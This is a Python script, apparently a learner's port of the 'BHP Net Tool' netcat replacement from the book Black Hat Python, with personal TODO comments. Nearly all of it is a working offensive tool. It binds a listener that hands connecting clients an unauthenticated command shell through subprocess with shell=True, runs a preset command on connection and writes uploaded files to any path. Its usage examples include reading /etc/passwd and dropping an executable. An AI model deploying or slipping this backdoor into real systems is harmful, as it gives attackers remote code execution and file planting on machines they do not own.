# Black Hat Python page 13
# Replacing Netcat - BHP Net Tool

import getopt
import socket
import subprocess
import sys
import threading

# global variables
listen = False
command = False  # True if server is executing a command shell
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0


# TODO convert to optparse instead of getopt
def usage():
    print("BHP Net Tool")
    print()
    print("Usage: bhpnet.py -t target_host -p port")
    print("-l --listen				- listen on [host]:[port] for incoming connections")
    print("-e --execute=file_to_run - execute the given file upon receiving a connection")
    print("-c --command				- initialize a command shell")
    print("-u --upload=destination	- upon receiving connection upload a file and write to [destination]")
    print()
    print()
    print("Examples:")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -c")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"")
    print("echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135")
    sys.exit(0)


def client_sender(buffer):
    print("[*] Creating socket")
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("[*] Socket created")

    try:
        # connect to target host
        client.connect((target, port))

        print("[*] Client connected")

        if len(buffer):
            client.send(buffer.encode('utf-8'))

        while True:

            # wait for data back
            recv_len = 1
            response = ""

            while recv_len:

                print("<DEBUG> Receiving data.")
                data = client.recv(4096).decode('utf-8')
                recv_len = len(data)
                response += data

                if recv_len < 4096:
                    break
            print("<Printing response>")
            print(response)

            # wait for more input
            # buffer = input("")  # was raw_input() in Python 2 TODO this acts weird...
            buffer = sys.stdin.readline()  # TODO read or readline
            # TODO needed?: buffer += "\n"

            # send it off
            client.send(buffer.encode('utf-8'))

    except:
        print("[*] Exception! Exiting.")
        client.close()


def server_loop():
    global target

    # if no target is defined, listen on all interfaces
    if not len(target):
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))
    server.listen(5)

    while True:
        print("[*] Server listening")
        client_socket, addr = server.accept()
        print("[*] Client connected")

        # spin off thread to handle client
        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.start()


def run_command(command):
    # trim newline
    command = command.rstrip()

    # run the command and get output back
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except:
        output = "Failed to execute the command.\r\n"

    return output


def client_handler(client_socket):
    global upload
    global execute
    global command

    # check for upload
    if len(upload_destination):
        # read in all of the bytes and write to our destination
        file_buffer = ""

        # keep reading data until none is available
        while True:
            data = client_socket.recv(1024).decode('utf-8')

            if not data:
                break
            else:
                file_buffer += data

        try:
            file_descriptor = open(upload_destination, "wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()

            # acknowledge that we wrote the file out
            client_socket.send(("Successfully saved file to %s\r\n" % upload_destination).encode('utf-8'))

        except:
            client_socket.send(("Failed to save file to %s\r\n" % upload_destination).encode('utf-8'))

    if len(execute):
        # run the command
        output = run_command(execute)

        client_socket.send(output.encode('utf-8'))

    if command:
        while True:
            # show simple command prompt
            client_socket.send("<BHP:#> ".encode('utf-8'))

            # receive until we see a linefeed
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024).decode('utf-8')

            # send back the command output
            response = run_command(cmd_buffer)

            if not response:
                response = "".encode('utf-8')  # or = b''

            # TODO test the string encoding... sometimes the response is bytes or str
            # fixed the type test by using type()
            if type(response) is str:
                response = response.encode('utf-8')
            print(response)
            print(len(response))
            print(type(response))

            if type(response) is not bytes:
                print('response is still not bytes... wtf?!?!?!')
                print('fixing it')
                response = b''

            # send back the response
            client_socket.send(response)


# TODO refactor to remove global variables
def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        usage()

    # read the commandline options
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:",
                                   ["help", "listen", "execute", "target", "port", "command", "upload"])
    except getopt.GetoptError as err:
        print(str(err))

    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--commandshell"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False, "Unhandled Option"

    # are we going to listen or just send data from stdin?
    if not listen and len(target) and port > 0:
        print("[*] Client attempting to connect...")

        # read in the buffer from the command line
        # this will block, send EOF (Ctrl-d on Linux, Ctrl-z on Windows)
        # if not sending input to stdin
        buffer = sys.stdin.read()  # TODO should it be read (original) or readline?

        # send data off
        print("[*] Sending data")
        client_sender(buffer)

    # list and potentially upload, execute commands or drop a shell back
    # depending on command line options
    if listen:
        server_loop()


main()
